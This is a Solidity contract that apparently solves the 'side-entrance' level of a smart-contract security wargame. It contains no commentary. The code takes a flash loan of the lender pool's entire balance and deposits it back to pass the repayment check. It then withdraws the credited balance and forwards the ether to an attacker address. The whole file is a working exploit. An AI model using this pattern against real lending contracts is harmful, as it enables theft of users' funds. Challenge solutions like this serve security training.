// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

contract PwnSideEntrance {
    using Address for address payable;
    address payable us;
    SideEntranceLenderPool pool;
    constructor(address _pool, address _us) {
	pool = SideEntranceLenderPool(_pool);
	us = payable(_us);
    }
    function pwn() external {
	pool.flashLoan(address(pool).balance);
	pool.withdraw();
    }
    function execute() external payable {
	pool.deposit{value: msg.value}();
    }
    receive() external payable {
	us.sendValue(msg.value);
    }
}
